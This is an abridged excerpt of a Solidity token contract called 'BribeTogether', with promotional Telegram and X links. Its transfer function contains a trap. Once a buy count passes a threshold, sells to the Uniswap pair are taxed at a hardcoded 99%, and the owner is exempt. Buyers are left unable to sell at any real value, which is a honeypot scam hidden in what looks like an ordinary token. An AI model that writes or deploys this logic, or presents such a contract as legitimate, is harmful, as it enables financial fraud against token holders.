...
/**
BribeTogether.app
BribeTogether Portal Chat; https://t.me/BribeTogether_Portal
BribeTogether X; https://twitter.com/BribeTogether
BribeTogether Bot; @BribeTogether_Bot
**/
...
contract BribeTogether is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"BribeTogether";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) {
            ...
            if(to == uniswapV2Pair && from!= address(this) ){
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?99:_initialSellTax).div(100);
